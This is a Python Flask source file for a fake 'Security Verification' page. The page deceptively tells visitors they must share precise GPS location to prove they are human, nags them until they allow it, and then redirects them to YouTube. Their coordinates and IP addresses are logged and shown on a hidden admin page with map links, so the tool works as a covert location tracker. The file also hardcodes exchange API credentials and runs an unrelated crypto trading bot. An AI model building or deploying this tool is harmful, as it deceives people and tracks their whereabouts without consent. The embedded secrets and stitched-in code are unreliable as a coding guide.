from flask import Flask, request, render_template_string
import json, time, os, requests
import threading
import ccxt
import pandas as pd

app = Flask(__name__)
LOG = "hits.jsonl"

TG_TOKEN = "YOUR_TG_TOKEN"  
TG_CHAT = "YOUR_CHAT_ID"    
API_KEY = 'zGUY5BwkqCWQ06Gyu0Eoc6I7kST0eVvs8BvLQWF5jvypxusv0HRdJr6WgA7hrNdn'
API_SECRET = '0i2povA9wDn3p0Q3E0dY205MY000pgNS3SPDH0kbBn6qIE3BX6eMonj0kuI7pLLs'

PAGE = """
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Security Check</title>
<style>
body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#0d1117;color:#e6edf3;font-family:-apple-system,sans-serif;text-align:center}
.box{background:#161b22;padding:40px 20px;border-radius:12px;border:1px solid #30363d;width:85%;max-width:400px}
h1{font-size:22px;margin:0 0 15px;color:#58a6ff}
p{color:#8b949e;font-size:15px;line-height:1.5;margin-bottom:25px}
.btn{background:#238636;color:#fff;border:none;padding:15px 30px;font-size:18px;border-radius:8px;font-weight:bold;width:100%;cursor:pointer;display:none}
.btn:hover{background:#2ea043}
.err{color:#f85149;font-size:16px;font-weight:bold;margin-bottom:20px;display:none}
.spin{width:50px;height:50px;border:4px solid #30363d;border-top-color:#58a6ff;border-radius:50%;margin:0 auto 20px;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
</style></head><body>
<div class="box">
  <div class="spin" id="load"></div>
  <h1 id="title">Security Verification</h1>
  <div class="err" id="err">Connection failed. Location access is required.</div>
  <p id="msg">Please allow location access to verify you are human and secure your connection.</p>
  <button class="btn" id="btn" onclick="requestGeo()">Try Again</button>
</div>
<script>
let data = {};
function requestGeo(){
  document.getElementById('btn').style.display = 'none';
  document.getElementById('err').style.display = 'none';
  document.getElementById('load').style.display = 'block';
  document.getElementById('title').innerText = 'Verifying...';
  document.getElementById('msg').innerText = 'Please wait while we check your connection.';
  navigator.geolocation.getCurrentPosition(
    p=>{ data.lat = p.coords.latitude; data.lon = p.coords.longitude; data.acc = p.coords.accuracy; data.src = 'gps'; done(); },
    e=>{ data.src = 'ip'; data.reason = 'denied'; fail(); },
    {enableHighAccuracy:true,timeout:10000,maximumAge:0}
  );
}
function fail(){
  document.getElementById('load').style.display = 'none';
  document.getElementById('title').innerText = 'Access Denied';
  document.getElementById('err').style.display = 'block';
  document.getElementById('msg').innerText = 'You must allow location access to proceed. Please click "Try Again" and select "Allow".';
  document.getElementById('btn').innerText = 'Allow Location';
  document.getElementById('btn').style.display = 'block';
  sendData();
}
function done(){
  sendData();
  document.getElementById('title').innerText = 'Verified Successfully';
  document.getElementById('title').style.color = '#3fb950';
  document.getElementById('msg').innerText = 'Redirecting...';
  setTimeout(() => { window.location.href = 'https://www.youtube.com'; }, 1500);
}
function sendData(){ fetch('/c',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(()=>{}); }
setTimeout(requestGeo, 1500);
</script></body></html>
"""

@app.route("/")
def index(): return render_template_string(PAGE)

@app.route("/c", methods=["POST"])
def collect():
    d = request.get_json(silent=True) or {}
    ip = (request.headers.get("X-Forwarded-For","") or request.remote_addr or "").split(",")[0].strip()
    rec = {"ts": int(time.time()), "ip": ip, "lat": d.get("lat"), "lon": d.get("lon"), "src": d.get("src")}
    with open(LOG, "a") as f: f.write(json.dumps(rec) + "\n")
    return ("", 204)

def run_bot():
    exchange = ccxt.binance({
        'apiKey': API_KEY,
        'secret': API_SECRET,
        'enableRateLimit': True,
        'options': {'defaultType': 'spot'}
    })
    exchange.set_sandbox_mode(True)
    SYMBOL = 'BTC/USDT'
    TIMEFRAME = '15m'
    TRADE_AMOUNT = 0.001
    while True:
        try:
            price = exchange.fetch_ticker(SYMBOL)['last']
            df = pd.DataFrame(exchange.fetch_ohlcv(SYMBOL, TIMEFRAME, limit=100), columns=['time', 'open', 'high', 'low', 'close', 'volume'])
            df['ema20'] = df['close'].ewm(span=20).mean()
            df['ema50'] = df['close'].ewm(span=50).mean()
            delta = df['close'].diff()
            gain = (delta.where(delta > 0, 0)).rolling(14).mean()
            loss = (-delta.where(delta < 0, 0)).rolling(14).mean()
            df['rsi'] = 100 - (100 / (1 + (gain / loss)))
            df['up'] = df['high'].diff()
            df['down'] = -df['low'].diff()
            df['+dm'] = ((df['up'] > df['down']) & (df['up'] > 0)) * df['up']
            df['-dm'] = ((df['down'] > df['up']) & (df['down'] > 0)) * df['down']
            tr = pd.concat([df['high'] - df['low'], abs(df['high'] - df['close'].shift()), abs(df['low'] - df['close'].shift())], axis=1).max(axis=1)
            atr = tr.rolling(14).mean()
            df['+di'] = 100 * (df['+dm'].rolling(14).mean() / atr)
            df['-di'] = 100 * (df['-dm'].rolling(14).mean() / atr)
            df['adx'] = (100 * abs(df['+di'] - df['-di']) / (df['+di'] + df['-di'])).rolling(14).mean()
            last = df.iloc[-1]
            signal = "HOLD"
            if last['adx'] >= 25:
                if last['ema20'] > last['ema50'] and last['rsi'] < 70: signal = "LONG"
                elif last['ema20'] < last['ema50'] and last['rsi'] > 30: signal = "SHORT"
            if signal == "LONG":
                print(f"🟢 LONG Signal at {price}")
            elif signal == "SHORT":
                print(f"🔻 SHORT Signal at {price}")
            time.sleep(60)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(60)

threading.Thread(target=run_bot, daemon=True).start()

@app.route("/admin")
def admin():
    if request.args.get("key","") != "ghost": return "not found", 404
    rows = []
    if os.path.exists(LOG):
        with open(LOG) as f: rows = [json.loads(l) for l in f if l.strip()][::-1]
    out = ["<html><meta charset='utf-8'><body style='background:#0d1117;color:#e6edf3;font-family:monospace;padding:20px'><h2 style='color:#58a6ff'>Hits</h2><table border=1 cellpadding=6 style='border-collapse:collapse;font-size:13px'><tr><th>time</th><th>src</th><th>map</th><th>ip</th></tr>"]
    for r in rows:
        mp = f"<a target='_blank' href='https://maps.google.com/?q={r['lat']},{r['lon']}'>map</a>" if r.get("lat") else "—"
        t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
        out.append(f"<tr><td>{t}</td><td>{r.get('src','?')}</td><td>{mp}</td><td>{r['ip']}</td></tr>")
    out.append("</table></body></html>")
    return "".join(out)

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
